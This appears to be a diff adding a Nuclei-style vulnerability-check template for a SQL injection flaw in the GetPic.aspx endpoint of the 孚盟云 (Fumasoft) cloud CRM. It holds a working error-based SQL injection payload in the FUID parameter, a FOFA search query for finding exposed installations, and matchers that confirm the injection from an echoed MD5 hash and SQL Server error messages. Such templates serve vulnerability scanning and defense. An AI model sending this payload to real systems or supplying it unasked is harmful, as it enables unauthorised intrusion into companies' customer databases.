@@ -1,0 +1,34 @@
+id: poc-yaml-fumasoft-getpic-ashx-sqli
+info:
+  name: 孚盟云 GetPic.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 孚盟云
+    fofa: app="孚盟软件-孚盟云"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /Common/GetPic.aspx?FUID=-1'and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))-- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "0x{{t2}}"
+        part: body
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+      - type: word
+        words:
+          - "FumaCRM"
+        part: body
